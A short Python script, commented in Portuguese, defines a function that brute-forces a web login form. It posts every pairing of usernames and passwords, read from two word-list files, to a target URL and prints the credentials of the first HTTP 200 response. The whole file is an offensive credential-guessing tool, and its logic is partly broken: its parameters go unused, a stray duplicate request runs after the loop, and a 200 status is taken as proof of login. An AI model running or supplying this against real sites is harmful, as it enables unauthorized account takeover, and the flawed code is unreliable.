import requests


def bruteforce_login(url, usuario, senha):
    """
    Função para realizar brute force em um formulário de login.

    :param url: URL do formulário de login
    :param usuario: Nome de usuário
    :param senha: Senha
    :return: None
    """
    
    with open('usuarios.txt', 'r') as usuarios_file:
        usuarios = usuarios_file.read().splitlines()
        
    with open('senhas.txt', 'r') as senhas_file:
        senhas = senhas_file.read().splitlines()  

    for usuario in usuarios:
        for senha in senhas:
            dados = {
                'username': usuario,
                'password': senha
            }
            try:
                
                response = requests.post(url, data=dados)

               
                if response.status_code == 200:
                    print(f"[+] Login bem-sucedido com {usuario}:{senha}")
                    return  # Para após encontrar uma combinação válida
                else:
                    print(f"[-] Falha no login com {usuario}:{senha} (Status: {response.status_code})")
            except requests.exceptions.RequestException as e:
                print(f"Erro ao acessar {url}: {e}")

    try:
        
        response = requests.post(url, data=dados)

        
        if response.status_code == 200:
            print(f"[+] Login bem-sucedido com {usuario}:{senha}")
        else:
            print(f"[-] Falha no login com {usuario}:{senha} (Status: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao acessar {url}: {e}")